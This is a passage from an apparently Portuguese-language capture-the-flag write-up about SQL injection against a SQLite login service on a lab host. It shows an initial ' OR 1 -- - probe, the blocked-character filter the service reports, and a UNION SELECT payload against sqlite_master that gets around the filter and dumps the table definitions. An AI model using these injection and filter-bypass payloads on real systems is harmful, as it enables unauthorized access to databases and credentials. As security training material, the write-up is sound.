Temos, então, o sistema de login para o banco de dados. Vamos tentar logar com o usuário descrito na room.

Conectando pelo nc

```bash

```

Bom, tentei analisar se era uma possível criptografia/hash, mas nada. Já que estamos falando de uma DB, nada mais justo do que testar o clássico SQLi in-band.

```bash
Please enter your username: ' OR 1 -- -
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
```

Opa, aparentemente temos um resultado diferente do esperado. Realmente aparenta que o vetor de ataque será SQLi, mas, pelo visto, teremos que seguir algumas regrinhas na hora de criar nosso payload.

Dada a sintaxe, é visível que estamos lidando com SQLite. Dito isso, tenho em mente algumas possíveis formas de contornar isso. O SQLite, primeiramente, não é case-sensitive, logo maiúsculas e minúsculas não afetam nada. Depois de alguns testes, é notório que o UNION está livre para uso. O jeito que abordei para pular as restrições foi o uso das aspas para substituir o `/*, -- or, %0b`.

```bash
  ~ nc 10.67.157.135 1337
Welcome to the Light database!
Please enter your username: ' Union Select group_concat(sql) from sqlite_master '
Password: CREATE TABLE usertable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER),CREATE TABLE admintable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER)

```
